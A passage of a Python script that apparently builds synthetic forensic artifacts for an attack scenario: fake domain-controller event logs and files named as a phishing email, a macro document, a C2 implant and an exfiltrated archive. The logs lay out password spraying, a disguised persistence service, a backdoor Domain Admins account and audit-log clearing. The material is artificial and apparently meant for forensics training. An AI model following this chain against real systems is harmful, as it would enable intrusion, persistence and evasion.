      <Data Name="Port">49818</Data>
      <Data Name="Status">0x0</Data>
    </EventData>
  </Event>

  <!-- 9. Password Spraying: Failed Logon for sql_svc (4625) at 10:00:28Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:28.000Z" />
      <EventRecordID>8002</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">sql_svc</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="Status">0xC000006D</Data>
      <Data Name="SubStatus">0xC000006A</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
    </EventData>
  </Event>

  <!-- 10. Password Spraying: Failed Logon for backup_admin (4625) at 10:00:29Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:29.000Z" />
      <EventRecordID>8003</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">backup_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="Status">0xC000006D</Data>
      <Data Name="SubStatus">0xC000006A</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
    </EventData>
  </Event>

  <!-- 11. Network Logon: TARGET\svc_admin (4624, LogonType 3) from 10.0.4.15 at 10:00:38Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4624</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:38.000Z" />
      <EventRecordID>8004</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">svc_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="LogonProcessName">NtLmSsp</Data>
      <Data Name="AuthenticationPackageName">NTLM</Data>
    </EventData>
  </Event>

  <!-- 12. Special Privileges Assigned: SeDebugPrivilege (4672) at 10:00:39Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4672</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:39.000Z" />
      <EventRecordID>8005</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="PrivilegeList">SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeImpersonatePrivilege</Data>
    </EventData>
  </Event>

  <!-- 13. Network Share Access: ADMIN$ (5140) at 10:00:40Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>5140</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:40.000Z" />
      <EventRecordID>8006</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="ShareName">\\*\ADMIN$</Data>
    </EventData>
  </Event>

  <!-- 14. Network Share Object Written: beacon_updater.exe (5145) at 10:00:41Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>5145</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:41.000Z" />
      <EventRecordID>8007</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="ShareName">\\*\ADMIN$</Data>
      <Data Name="RelativeTargetName">System32\beacon_updater.exe</Data>
      <Data Name="AccessMask">0x12019F</Data>
    </EventData>
  </Event>

  <!-- 15. Service Creation: WindowsDefendUpdateSvc (7045) at 10:00:45Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7045</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:45.000Z" />
      <EventRecordID>8008</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="ServiceName">WindowsDefendUpdateSvc</Data>
      <Data Name="ImagePath">C:\Windows\System32\beacon_updater.exe --service</Data>
      <Data Name="ServiceType">user mode service</Data>
      <Data Name="StartType">auto start</Data>
      <Data Name="AccountName">LocalSystem</Data>
    </EventData>
  </Event>

  <!-- 16. Process Creation: beacon_updater.exe executed by Service (4688) at 10:00:48Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:48.000Z" />
      <EventRecordID>8009</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="NewProcessName">C:\Windows\System32\beacon_updater.exe</Data>
      <Data Name="CommandLine">"C:\Windows\System32\beacon_updater.exe" --service</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\services.exe</Data>
      <Data Name="Hashes">MD5={pe_md5},SHA256={pe_sha256}</Data>
    </EventData>
  </Event>

  <!-- 17. User Account Created: svc_backdoor (4720) at 10:01:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4720</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:00.000Z" />
      <EventRecordID>8010</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">svc_backdoor</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
    </EventData>
  </Event>

  <!-- 18. Member Added to Security Group: Domain Admins (4728) at 10:01:02Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4728</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:02.000Z" />
      <EventRecordID>8011</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="MemberName">CN=svc_backdoor,CN=Users,DC=target,DC=local</Data>
      <Data Name="TargetUserName">Domain Admins</Data>
      <Data Name="SubjectUserName">svc_admin</Data>
    </EventData>
  </Event>

  <!-- 19. Anti-Forensics: Security Audit Log Cleared (1102) at 10:01:25Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Eventlog" />
      <EventID>1102</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:25.000Z" />
      <EventRecordID>8012</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <UserData>
      <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
        <SubjectUserName>svc_admin</SubjectUserName>
        <SubjectDomainName>TARGET</SubjectDomainName>
        <Channel>Security</Channel>
      </LogFileCleared>
    </UserData>
  </Event>
</Events>"""

    with open(out_file, "w", encoding="utf-8") as f:
        f.write(xml_content)
    print(f"[+] Successfully wrote Host B EVTX: {out_file}")

# -------------------------------------------------------------------------
# 9. Main Orchestrator
# -------------------------------------------------------------------------
if __name__ == "__main__":
    print("[=== Synthesizing Correlated Attack Scenario Files in Dependency Order ===]")
    
    # 1. 03_c2_implant_beacon.exe
    pe_path = os.path.join(OUT_DIR, "03_c2_implant_beacon.exe")
    with open(pe_path, "wb") as f:
        f.write(PE_BYTES)
    print(f"[+] Staged PE written: {pe_path} ({len(PE_BYTES)} bytes)")

    # 2. 07_exfiltrated_archive.zip
    zip_path = os.path.join(OUT_DIR, "07_exfiltrated_archive.zip")
    with open(zip_path, "wb") as f:
        f.write(ZIP_BYTES)
    print(f"[+] Exfil Zip written: {zip_path} ({len(ZIP_BYTES)} bytes)")

    # 3. 02_weaponized_document.docm
    docm_path = os.path.join(OUT_DIR, "02_weaponized_document.docm")
    with open(docm_path, "wb") as f:
        f.write(DOCM_BYTES)
    print(f"[+] Weaponized Doc written: {docm_path} ({len(DOCM_BYTES)} bytes)")

    # 4. 01_phishing_email.msg
    msg_path = os.path.join(OUT_DIR, "01_phishing_email.msg")
    with open(msg_path, "wb") as f:
        f.write(MSG_BYTES)
    print(f"[+] Phishing Email written: {msg_path} ({len(MSG_BYTES)} bytes)")

    # 5. 06_network_traffic_capture.pcap
    build_pcap(PE_BYTES, ZIP_BYTES)

    # 6. 04_endpoint_workstation_hostA.evtx
    build_host_a_evtx(DOCM_SHA256, DOCM_MD5, PE_SHA256, PE_MD5, ZIP_SHA256, ZIP_MD5)

    # 7. 05_endpoint_domain_controller_hostB.evtx
    build_host_b_evtx(PE_SHA256, PE_MD5)

    print("\n[=== Artifact Cryptographic Verification Summary ===]")
    print(f"01_phishing_email.msg               -> Embeds 02_weaponized_document.docm (SHA-256: {DOCM_SHA256[:16]}...)")
    print(f"02_weaponized_document.docm         -> SHA-256: {DOCM_SHA256}")
    print(f"03_c2_implant_beacon.exe            -> SHA-256: {PE_SHA256}")
    print(f"04_endpoint_workstation_hostA.evtx  -> Logs DOCM ({DOCM_SHA256[:16]}...), PE ({PE_SHA256[:16]}...), ZIP ({ZIP_SHA256[:16]}...)")
    print(f"05_endpoint_domain_controller_hostB -> Logs PE ({PE_SHA256[:16]}...)")
    print(f"06_network_traffic_capture.pcap     -> Carves PE ({PE_SHA256[:16]}...) & ZIP ({ZIP_SHA256[:16]}...)")
    print(f"07_exfiltrated_archive.zip          -> SHA-256: {ZIP_SHA256}")
    print("[=== All 7 Correlated Artifacts Generated Successfully ===]")
